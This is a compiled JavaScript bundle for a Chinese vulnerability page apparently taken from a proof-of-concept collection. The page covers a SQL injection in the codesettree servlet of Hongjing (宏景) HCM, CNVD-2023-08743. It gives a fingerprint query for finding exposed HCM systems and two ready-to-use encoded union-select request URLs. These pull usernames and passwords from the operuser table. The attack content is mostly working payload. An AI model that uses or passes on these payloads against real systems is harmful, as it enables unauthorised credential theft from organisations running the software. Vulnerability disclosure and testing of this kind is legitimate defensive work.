(window.webpackJsonp=window.webpackJsonp||[]).push([[503],{2445:function(s,t,a){s.exports=a.p+"assets/img/1683867071190-3dd51bbf-781c-402c-9664-b769099d6c2a.be0d8017.png"},2446:function(s,t,a){s.exports=a.p+"assets/img/1686056902027-f31d6443-4eac-449e-9228-23edc783f56f.57c26142.png"},3277:function(s,t,a){"use strict";a.r(t);var r=a(64),e=Object(r.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"宏景-hcm-codesettree-sql注入漏洞-cnvd-2023-08743"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#宏景-hcm-codesettree-sql注入漏洞-cnvd-2023-08743"}},[s._v("#")]),s._v(" 宏景 HCM codesettree SQL注入漏洞 CNVD-2023-08743")]),s._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),t("p",[s._v("宏景 HCM codesettree 接口存在SQL注入漏洞，攻击者通过漏洞可以获取到登陆系统的账号密码和数据库信息")]),s._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("宏景 HCM")]),t("br"),s._v(" "),t("h2",{attrs:{id:"网络测绘"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),t("p",[s._v('app="HJSOFT-HCM"'),t("br")]),s._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),t("p",[s._v("登陆页面")]),s._v(" "),t("p",[t("img",{attrs:{src:a(2445),alt:"img"}})]),s._v(" "),t("p",[s._v("验证POC")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("servlet"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("codesettree"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v("flag"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("c"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("status"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("codesetid"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("parentid"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("categories"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("31")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("union"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("all"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("select"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("31")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("cusername"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("from"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("operuser"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("d"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("d\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("servlet"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("codesettree"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v("flag"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("c"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("status"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("codesetid"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("parentid"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("categories"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("31")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("union"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("all"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("select"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("31")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("cpassword"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("from"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("operuser"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("d"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("~")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("d\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[t("img",{attrs:{src:a(2446),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=e.exports}}]);